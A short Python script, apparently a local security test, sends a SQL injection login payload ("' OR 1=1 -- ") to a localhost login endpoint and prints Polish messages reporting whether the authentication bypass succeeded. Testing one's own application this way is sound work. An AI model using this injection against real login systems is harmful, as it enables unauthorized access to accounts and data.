import requests

url_login = 'http://localhost:5000/login'

login_payload = {"username": "' OR 1=1 -- ", "password": "anything"}
login_response = requests.post(url_login, json=login_payload)

if login_response.status_code == 200:
    login_data = login_response.json()
    if "message" in login_data:
        print("Udane logowanie!")
        print("Użyte dane logowania:")
        print(login_payload)

    else:
        print("Błąd logowania:", login_data.get("error"))
else:
    print("Błąd podczas logowania:", login_response.text)
